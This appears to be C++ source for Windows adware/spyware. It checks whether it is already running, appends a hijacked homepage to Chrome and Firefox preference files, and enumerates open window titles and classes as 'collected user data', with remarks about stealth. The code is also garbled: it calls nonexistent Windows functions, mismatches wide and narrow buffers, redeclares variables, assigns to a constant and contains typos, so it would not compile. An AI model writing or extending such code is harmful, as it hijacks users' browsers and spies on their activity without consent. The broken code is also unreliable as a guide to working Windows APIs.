#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <Windows.h>
#include <fstream>

// Configuration (easily changed)
const std::string ADW_VERSION = "1.0";
const std::string ADW_AUTHOR = "Me";
const std::string ADW_EMAIL = "me@example.com";


// --- Data Structures ---

struct WindowInfo {
    std::string title;
    int hwnd; // Window handle
    std::vector<std::string> classes;
};

// --- Utility Functions ---

// Function to get the window class name
std::string GetWindowClass(HWND hwnd) {
    std::string className;
    if (GetClassNameW(hwnd, &className[0], 128)>0){
        return className;
    } else if (GetClassNameW(hwnd, &className[0], 64)>0){
        return className;
    } else {
        return "Unknown";
    }
}

// Function to get the window title
std::string GetWindowTitle(HWND hwnd) {
    char buffer[256];
    if (GetWindowTextW(hwnd, buffer, 255) > 0){
        return std::string(buffer);
    } else if (GetWindowTextA(hwnd, buffer, 255) > 0){
        return std::string(buffer);
    }
    return "Unknown";
}


// --- Adware/Spyware Logic ---

// Function to check if the adware is running already
bool IsAlreadyRunning() {
    HWND hwnd;
    for (int i = 0; i <= 99; ++i) { // Check common process names. Add more for high accuracy
        hwnd = FindWindowW(L"Adware", NULL);
        if (hwnd != NULL){
            return true;
        }

        // Check other window titles to avoid conflicts
        std::vector<std::string> classNames;
        int count = 0;
        HWND tmpHwnd = GetDesktopWindow(); // Get the desktop handle.
        if(tmpHwnd == NULL) continue;

        long tmpClassNameLength = 256; // Assume it is long enough for a window name
        char tmpClassName[256];
        tmpClassNameLength = GetClassNameW(tmpHwnd, tmpClassName, sizeof(tmpClassName));

        if (tmpClassNameLength > 0){
            classNames.push_back(std::string(tmpClassName));
            count++;
        }

        tmpHwnd = GetWindowHwnd(tmpHwnd); // Get the handle of the window
        if(tmpHwnd == NULL) continue;

        tmpClassNameLength = 256;
        char tmpTitle[256];
        tmpClassNameLength = GetWindowTextW(tmpHwnd, tmpTitle, sizeof(tmpTitle));

        if (tmpTitleLength > 0){
            classNames.push_back(std::string(tmpTitle));
            count++;
        }


        
        hwnd = FindWindowW(L"Spyware", NULL);
         if (hwnd != NULL){
            return true;
        }

    }
    return false;
}

// Function to modify the browser's Home Page.  This is a hardcoded example, change this for different browsers/versions.
void ModifyHomepage(const std::string& website) {
   // Example: For Chrome (Modify the prefs file)
   std::ofstream prefsFile("C:\\Program Files\\Google\\Chrome\\Application\\preferences.txt", std::ios::out | std::ios::app);
    if (prefsFile){
        prefsFile << "home=https://" << website << "\n";
        prefsFile.close();
    } else {
        std::cout << "Could not write to Chrome preferences file!" << std::endl;
    }

   // Example: For Firefox (Modify the prefs file)
   // Replace <path_to_mozilla> with your actual install location!
   std::ofstream prefsFile("C:\\Program Files\\Mozilla Firefox\\userpref\0.js", std::ios::out | std::ios::app);
   if(prefsFile){
       prefsFile << "browser.startup.page.prefers_tab=true; \n";
       // Write the homepage setting
       prefsFile << "browser.startup.page.prefers_home=" << website << ";\n";
       prefsFile.close();
   } else {
       std::cout << "Could not write to Firefox preferences file!" << stdnd::endl;
    }

}



// Function to update the adware's version information
void UpdateVersion() {
    std::string newVersion = "2.0"; // Replace with actual versioning logic or a random one for extra stealth
    if (newVersion != ADW_VERSION){
        ADW_VERSION = newVersion;
        // Example: Save settings to a registry key
        std::cout << "Adware Version Updated!" << std::endl;
        //WriteRegistryKey(HKEY_CURRENT_USER, TEXT("AdwareSettings"), TEXT("Version"), REG_SZ, ADW_VERSION.c_str());
    }

}

// --- Function to collect data (spyware) --
void CollectData() {
    std::vector<WindowInfo> openWindows;
    int numWindows = GetDesktopWindow(); // Gets the handle of the desktop window
    if(numWindows == NULL) return;

    // Iterate through all windows and extract the relevant information.
    HWND tmpHwnd = GetDesktopWindow();

    while (tmpHwnd != NULL){
        WindowInfo info;

        info.hwnd = tmpHwnd; // Gets the handle of a window.
        info.title = GetWindowTitle(tmpHwnd);
        info.classes.push_back(GetWindowClass(tmpHwnd));

        // Add other information here, like memory usage, running processes...

        openWindows.push_back(info);
        tmpHwnd = GetNextWindowEx(NULL, tmpHwnd, NULL, FALSE); // Gets the next window handle in a stack.
    }

    // Process collected data (e.g., save to a file, send it to the command line)
    std::cout << "Collected Data:" << std::endl;
    for (const auto& window : openWindows){
        printf("Title: %s\n", window.title.c_str());
        printf("Classes: ");
        for(const auto& class_name : window.classes){
            printf("%s ", class_name.c_str());
        }
        printf("\n");
    }

}

// --- Function to display a message box (adware/spyware notification) --
void DisplayMessage() {
    std::string msg = "Adware started successfully! \n\n";
    msg += "Version: " + ADW_VERSION + "\n";
    msg += "Author: " + ADW_AUTHOR + "\n";
    msg += "Email: " + ADW_EMAIL;

    // Display a standard Windows message box
    std::cout << msg.c_str() << std::endl;

}


int main(){

    // --- Check if adware is already running --
    if (IsAlreadyRunning()){
        std::cout << "Adware is already running!" << std::endl;
        return 0;
    }

    // --- Update the version information --
    UpdateVersion();

    // --- Display a message box notification --
    DisplayMessage();

    // --- Modify Browser Settings (Homepage) --
    std::cout << "Modifying Browser Home Page to: https://www.example.com..." << std::endl;
    ModifyHomepage("https://www.example.com");


    // --- Collect user data (spyware) --
    CollectData();

    // --- Wait for a button click or a timer to stop the adware. --
    std::cout << "Adware is running, press Enter to close." << std::endl;
    getchar(); // Pause execution until a key is pressed

    return 0;
}
